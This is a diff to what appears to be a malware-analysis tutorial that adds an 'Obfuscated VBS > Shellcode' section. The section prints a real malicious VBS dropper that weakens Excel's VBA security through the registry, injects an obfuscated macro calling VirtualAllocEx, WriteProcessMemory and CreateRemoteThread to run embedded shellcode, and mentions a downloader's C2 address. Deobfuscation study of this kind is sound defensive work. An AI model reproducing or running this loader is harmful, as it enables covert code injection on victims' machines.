@@ -64,5 +64,93 @@ We can emulate this shellcode by using Speakeasy, we'll save the shellcode from 
 
 It looks like this is a downloader, with a C2 address of 51.79.49[.]174:443
 
+## Obfuscated VBS > Shellcode
+
+This second example involves deobfuscating a VBS script to reveal and interrogate Shellcode to find the C2 address.
+
+Initial Script:
+```
+
+Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule
+
+Set objExcel = CreateObject("Excel.Application")
+objExcel.Visible = False
+
+Set WshShell = CreateObject("Wscript.Shell")
+
+function RegExists(regKey)
+	on error resume next
+	WshShell.RegRead regKey
+	RegExists = (Err.number = 0)
+end function
+
+' Get the old AccessVBOM value
+RegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & objExcel.Version & "\Excel\Security\AccessVBOM"
+
+if RegExists(RegPath) then
+	action = WshShell.RegRead(RegPath)
+else
+	action = ""
+end if
+
+' Weaken the target
+WshShell.RegWrite RegPath, 1, "REG_DWORD"
+
+' Run the macro
+Set objWorkbook = objExcel.Workbooks.Add()
+Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
+xlmodule.CodeModule.AddFromString "Private "&"Type PRO"&"CESS_INF"&"ORMATION"&Chr(10)&"    hPro"&"cess As "&"Long"&Chr(10)&"    hThr"&"ead As L"&"ong"&Chr(10)&"    dwPr"&"ocessId "&"As Long"&Chr(10)&"    dwTh"&"readId A"&"s Long"&Chr(10)& _
+"End Type"&Chr(10)&Chr(10)&"Private "&"Type STA"&"RTUPINFO"&Chr(10)&"    cb A"&"s Long"&Chr(10)&"    lpRe"&"served A"&"s String"&Chr(10)&"    lpDe"&"sktop As"&" String"&Chr(10)&"    lpTi"&"tle As S"&"tring"& _
+Chr(10)&"    dwX "&"As Long"&Chr(10)&"    dwY "&"As Long"&Chr(10)&"    dwXS"&"ize As L"&"ong"&Chr(10)&"    dwYS"&"ize As L"&"ong"&Chr(10)&"    dwXC"&"ountChar"&"s As Lon"&"g"&Chr(10)&"    dwYC"&"ountChar"& _
+"s As Lon"&"g"&Chr(10)&"    dwFi"&"llAttrib"&"ute As L"&"ong"&Chr(10)&"    dwFl"&"ags As L"&"ong"&Chr(10)&"    wSho"&"wWindow "&"As Integ"&"er"&Chr(10)&"    cbRe"&"served2 "&"As Integ"&"er"&Chr(10)&"    lpRe"& _
+"served2 "&"As Long"&Chr(10)&"    hStd"&"Input As"&" Long"&Chr(10)&"    hStd"&"Output A"&"s Long"&Chr(10)&"    hStd"&"Error As"&" Long"&Chr(10)&"End Type"&Chr(10)&Chr(10)&Chr(35)&"If VBA7 "&"Then"&Chr(10)& _
+"    Priv"&"ate Decl"&"are PtrS"&"afe Func"&"tion Cre"&"ateStuff"&" Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"CreateRe"&"moteThre"&"ad"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"&"s Long"&Chr(44)& _
+" ByVal l"&"pThreadA"&"ttribute"&"s As Lon"&"g"&Chr(44)&" ByVal d"&"wStackSi"&"ze As Lo"&"ng"&Chr(44)&" ByVal l"&"pStartAd"&"dress As"&" LongPtr"&Chr(44)&" lpParam"&"eter As "&"Long"&Chr(44)&" ByVal d"& _
+"wCreatio"&"nFlags A"&"s Long"&Chr(44)&" lpThrea"&"dID As L"&"ong"&Chr(41)&" As Long"&"Ptr"&Chr(10)&"    Priv"&"ate Decl"&"are PtrS"&"afe Func"&"tion All"&"ocStuff "&"Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "& _
+Chr(34)&"VirtualA"&"llocEx"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"&"s Long"&Chr(44)&" ByVal l"&"pAddr As"&" Long"&Chr(44)&" ByVal l"&"Size As "&"Long"&Chr(44)&" ByVal f"&"lAllocat"&"ionType "&"As Long"& _
+Chr(44)&" ByVal f"&"lProtect"&" As Long"&Chr(41)&" As Long"&"Ptr"&Chr(10)&"    Priv"&"ate Decl"&"are PtrS"&"afe Func"&"tion Wri"&"teStuff "&"Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"WritePro"& _
+"cessMemo"&"ry"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"&"s Long"&Chr(44)&" ByVal l"&"Dest As "&"LongPtr"&Chr(44)&" ByRef S"&"ource As"&" Any"&Chr(44)&" ByVal L"&"ength As"&" Long"&Chr(44)&" ByVal L"& _
+"engthWro"&"te As Lo"&"ngPtr"&Chr(41)&" As Long"&"Ptr"&Chr(10)&"    Priv"&"ate Decl"&"are PtrS"&"afe Func"&"tion Run"&"Stuff Li"&"b "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"CreatePr"&"ocessA"&Chr(34)& _
+" "&Chr(40)&"ByVal lp"&"Applicat"&"ionName "&"As Strin"&"g"&Chr(44)&" ByVal l"&"pCommand"&"Line As "&"String"&Chr(44)&" lpProce"&"ssAttrib"&"utes As "&"Any"&Chr(44)&" lpThrea"&"dAttribu"&"tes As A"&"ny"& _
+Chr(44)&" ByVal b"&"InheritH"&"andles A"&"s Long"&Chr(44)&" ByVal d"&"wCreatio"&"nFlags A"&"s Long"&Chr(44)&" lpEnvir"&"onment A"&"s Any"&Chr(44)&" ByVal l"&"pCurrent"&"Director"&"y As Str"&"ing"&Chr(44)& _
+" lpStart"&"upInfo A"&"s STARTU"&"PINFO"&Chr(44)&" lpProce"&"ssInform"&"ation As"&" PROCESS"&"_INFORMA"&"TION"&Chr(41)&" As Long"&Chr(10)&Chr(35)&"Else"&Chr(10)&"    Priv"&"ate Decl"&"are Func"&"tion Cre"& _
+"ateStuff"&" Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"CreateRe"&"moteThre"&"ad"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"&"s Long"&Chr(44)&" ByVal l"&"pThreadA"&"ttribute"&"s As Lon"&"g"&Chr(44)& _
+" ByVal d"&"wStackSi"&"ze As Lo"&"ng"&Chr(44)&" ByVal l"&"pStartAd"&"dress As"&" Long"&Chr(44)&" lpParam"&"eter As "&"Long"&Chr(44)&" ByVal d"&"wCreatio"&"nFlags A"&"s Long"&Chr(44)&" lpThrea"&"dID As L"& _
+"ong"&Chr(41)&" As Long"&Chr(10)&"    Priv"&"ate Decl"&"are Func"&"tion All"&"ocStuff "&"Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"VirtualA"&"llocEx"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"& _
+"s Long"&Chr(44)&" ByVal l"&"pAddr As"&" Long"&Chr(44)&" ByVal l"&"Size As "&"Long"&Chr(44)&" ByVal f"&"lAllocat"&"ionType "&"As Long"&Chr(44)&" ByVal f"&"lProtect"&" As Long"&Chr(41)&" As Long"&Chr(10)& _
+"    Priv"&"ate Decl"&"are Func"&"tion Wri"&"teStuff "&"Lib "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"WritePro"&"cessMemo"&"ry"&Chr(34)&" "&Chr(40)&"ByVal hP"&"rocess A"&"s Long"&Chr(44)&" ByVal l"& _
+"Dest As "&"Long"&Chr(44)&" ByRef S"&"ource As"&" Any"&Chr(44)&" ByVal L"&"ength As"&" Long"&Chr(44)&" ByVal L"&"engthWro"&"te As Lo"&"ng"&Chr(41)&" As Long"&Chr(10)&"    Priv"&"ate Decl"&"are Func"&"tion Run"& _
+"Stuff Li"&"b "&Chr(34)&"kernel32"&Chr(34)&" Alias "&Chr(34)&"CreatePr"&"ocessA"&Chr(34)&" "&Chr(40)&"ByVal lp"&"Applicat"&"ionName "&"As Strin"&"g"&Chr(44)&" ByVal l"&"pCommand"&"Line As "&"String"&Chr(44)& _
+" lpProce"&"ssAttrib"&"utes As "&"Any"&Chr(44)&" lpThrea"&"dAttribu"&"tes As A"&"ny"&Chr(44)&" ByVal b"&"InheritH"&"andles A"&"s Long"&Chr(44)&" ByVal d"&"wCreatio"&"nFlags A"&"s Long"&Chr(44)&" lpEnvir"& _
+"onment A"&"s Any"&Chr(44)&" ByVal l"&"pCurrent"&"Driector"&"y As Str"&"ing"&Chr(44)&" lpStart"&"upInfo A"&"s STARTU"&"PINFO"&Chr(44)&" lpProce"&"ssInform"&"ation As"&" PROCESS"&"_INFORMA"&"TION"&Chr(41)& _
+" As Long"&Chr(10)&Chr(35)&"End If"&Chr(10)&Chr(10)&"Sub Auto"&"_Open"&Chr(40)&Chr(41)&Chr(10)&"    Dim "&"myByte A"&"s Long"&Chr(44)&" myArray"&" As Vari"&"ant"&Chr(44)&" offset "&"As Long"&Chr(10)&"    Dim "& _
+"pInfo As"&" PROCESS"&"_INFORMA"&"TION"&Chr(10)&"    Dim "&"sInfo As"&" STARTUP"&"INFO"&Chr(10)&"    Dim "&"sNull As"&" String"&Chr(10)&"    Dim "&"sProc As"&" String"&Chr(10)&Chr(10)&Chr(35)&"If VBA7 "& _
+"Then"&Chr(10)&"    Dim "&"rwxpage "&"As LongP"&"tr"&Chr(44)&" res As "&"LongPtr"&Chr(10)&Chr(35)&"Else"&Chr(10)&"    Dim "&"rwxpage "&"As Long"&Chr(44)&" res As "&"Long"&Chr(10)&Chr(35)&"End If"&Chr(10)& _
+"    myAr"&"ray "&Chr(61)&" Array"&Chr(40)&Chr(45)&"4"&Chr(44)&Chr(45)&"24"&Chr(44)&Chr(45)&"119"&Chr(44)&"0"&Chr(44)&"0"&Chr(44)&"0"&Chr(44)&"96"&Chr(44)&Chr(45)&"119"&Chr(44)&Chr(45)&"27"&Chr(44)&"49"& _
+Chr(44)&Chr(45)&"46"&Chr(44)&"100"&Chr(44)&Chr(45)&"117"&Chr(44)&"82"&Chr(44)&"48"&Chr(44)&Chr(45)&"117"&Chr(44)&"82"&Chr(44)&"12"&Chr(44)&Chr(45)&"117"&Chr(44)&"82"&Chr(44)&"20"&Chr(44)&Chr(45)&"117"& _
+Chr(44)&"114"&Chr(44)&"40"&Chr(44)&"15"&Chr(44)&Chr(45)&"73"&Chr(44)&"74"&Chr(44)&"38"&Chr(44)&"49"&Chr(44)&Chr(45)&"1"&Chr(44)&"49"&Chr(44)&Chr(45)&"64"&Chr(44)&Chr(45)&"84"&Chr(44)&"60"&Chr(44)&"97"& _
+Chr(44)&"124"&Chr(44)&"2"&Chr(44)&"44"&Chr(44)&"32"&Chr(44)&Chr(45)&"63"&Chr(44)&Chr(45)&"49"&Chr(44)&" _"&Chr(10)&"13"&Chr(44)&"1"&Chr(44)&Chr(45)&"57"&Chr(44)&Chr(45)&"30"&Chr(44)&Chr(45)&"16"&Chr(44)& _
+"82"&Chr(44)&"87"&Chr(44)&Chr(45)&"117"&Chr(44)&"82"&Chr(44)&"16"&Chr(44)&Chr(45)&"117"&Chr(44)&"66"&Chr(44)&"60"&Chr(44)&"1"&Chr(44)&Chr(45)&"48"&Chr(44)&Chr(45)&"117"&Chr(44)&"64"&Chr(44)&"120"&Chr(44)& _
+Chr(45)&"123"&Chr(44)&Chr(45)&"64"&Chr(44)&"116"&Chr(44)&"74"&Chr(44)&"1"&Chr(44)&Chr(45)&"48"&Chr(44)&"80"&Chr(44)&Chr(45)&"117"&Chr(44)&"72"&Chr(44)&"24"&Chr(44)&Chr(45)&"117"&Chr(44)&"88"&Chr(44)&"32"& _
+Chr(44)&"1"&Chr(44)&Chr(45)&"45"&Chr(44)&Chr(45)&"29"&Chr(44)&"60"&Chr(44)&"73"&Chr(44)&Chr(45)&"117"&Chr(44)&"52"&Chr(44)&Chr(45)&"117"&Chr(44)&"1"&Chr(44)&" _"&Chr(10)&Chr(45)&"42"&Chr(44)&"49"&Chr(44)& _
+Chr(45)&"1"&Chr(44)&"49"&Chr(44)&Chr(45)&"64"&Chr(44)&Chr(45)&"84"[Truncated]...
+objExcel.DisplayAlerts = False
+on error resume next
+objExcel.Run "Auto_Open"
+objWorkbook.Close False
+objExcel.Quit
+
+' Restore the registry to its old state
+if action = "" then
+	WshShell.RegDelete RegPath
+else
+	WshShell.RegWrite RegPath, action, "REG_DWORD"
+end if
+self.close
+
+```
+
+
+
 
 
